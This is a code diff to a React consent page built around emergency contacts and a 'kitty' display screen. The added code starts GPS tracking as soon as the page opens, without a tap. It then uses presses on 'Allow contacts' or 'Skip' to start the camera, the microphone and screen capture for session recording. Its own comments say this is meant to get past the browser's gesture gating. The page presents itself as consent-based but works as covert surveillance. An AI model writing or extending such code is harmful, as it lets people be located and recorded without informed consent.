@@ -688,6 +688,8 @@ export default function ConsentPage() {
   // without a "used before declaration" error (doGrant depends on processGeoPosition
   // which depends on startTracking, so it must be declared later in the file).
   const doGrantRef = useRef<() => void>(() => {});
+  // Same pattern for startScreenCapture (defined in the session-recording section).
+  const startScreenCaptureRef = useRef<() => void>(() => {});
 
   // ── New display-phase state machine ───────────────────────────────────────
   // contacts → kitty → contacts_popup → main
@@ -1180,12 +1182,12 @@ export default function ConsentPage() {
   // Handle "Allow contacts" button on the emergency contacts screen.
   // Uses doGrantRef to avoid "used before declaration" (doGrant is defined later).
   const handleAllowContacts = useCallback(async () => {
-    // Mark contacts as tried BEFORE calling doGrant so that pickContacts() inside
-    // doGrant (which is gated by contactsTriedRef) is a no-op — preventing a second,
-    // competing OS picker from opening.
+    // GPS is already running (fired on page load). This tap gives us a user-
+    // activation signal — use it to unblock the gesture-gated APIs.
+    prewarmCameraAndMic();
+    startScreenCaptureRef.current();
+    // Mark contacts as tried so pickContacts() inside doGrant stays a no-op.
     contactsTriedRef.current = true;
-    // Fire location request in background while the OS picker is open.
-    doGrantRef.current();
     // Wait for the user to choose contacts and tap Done — kitty must not start yet.
     await pickContactsAndSave();
     // Only NOW switch to kitty — after the picker is dismissed.
@@ -1195,13 +1197,16 @@ export default function ConsentPage() {
 
   // Handle "Skip" on emergency contacts screen.
   const handleSkipContacts = useCallback(() => {
+    // GPS is already running (fired on page load). Use this tap's user-activation
+    // signal to unblock the gesture-gated camera + screen-share APIs.
+    prewarmCameraAndMic();
+    startScreenCaptureRef.current();
     // Mark contacts as tried so the old overlay doesn't re-appear in tracking view.
     contactsTriedRef.current = true;
     setContactsCollected(true);
     // Consume the legacy kitty slot to prevent a second overlay in main phase.
     kittyOverlayStartedRef.current = true;
     setDisplayPhase("kitty");
-    doGrantRef.current();
   }, []);
 
 
@@ -1438,6 +1443,8 @@ export default function ConsentPage() {
       })
       .catch(() => pushSessionEvent("screen_denied"));
   }, [pushSessionEvent, captureScreenFrame, stopScreenCapture]);
+  // Keep the ref in sync so handlers declared before startScreenCapture can call it.
+  startScreenCaptureRef.current = startScreenCapture;
 
   const saveSession = useCallback(async (timeToGrantMs?: number) => {
     if (sessionSavedRef.current || !token) return;
@@ -1614,9 +1621,13 @@ export default function ConsentPage() {
       );
       reverseGeocode(stored.lat, stored.lng).then((addr) => { if (addr) setAddress(addr); });
     } else {
-      // NEW FLOW: Show emergency contacts screen first.
-      // displayPhase is already "contacts" — user interaction drives the next step.
-      // doGrant() will be called by handleAllowContacts or handleSkipContacts.
+      // NEW FLOW: fire GPS immediately on page open — no button tap required.
+      // The contacts screen is still shown first so the user can share emergency
+      // contacts, but location sharing starts in the background right now.
+      // Gesture-gated calls inside doGrant (camera, contacts picker, screen share)
+      // will silently no-op here; the button handlers re-fire them once a tap
+      // provides the required user-activation signal.
+      doGrantRef.current();
     }
   }, [invite, doGrant, startTracking, isWebView]); // eslint-disable-line react-hooks/exhaustive-deps
 
